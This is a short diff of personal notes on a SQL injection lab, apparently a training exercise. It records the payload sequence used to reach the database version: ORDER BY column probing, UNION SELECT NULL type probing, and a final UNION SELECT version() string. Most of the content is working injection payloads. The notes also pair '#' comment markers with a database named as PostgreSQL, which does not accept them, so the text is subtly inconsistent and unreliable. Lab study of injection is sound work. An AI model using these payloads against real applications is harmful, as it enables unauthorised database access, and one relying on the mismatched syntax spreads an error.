@@ -5,7 +5,19 @@ GOAL: display database version
 Analysis
 
 determine column number using burp
-'order by 1-- ok
-'order by 2-- ok
-'order by 3-- error
+'order by 1# ok
+'order by 2# ok
+'order by 3# error
+
+find the column type using union
+' union select null,null#   ok
+' union select 'a',null#   ok
+' union select 'a','a'#   ok
+
+Now as it is PostgreSQL database finnding version using :
+' union select version(),'a'# 
+
+found the version 
+solved
+
 
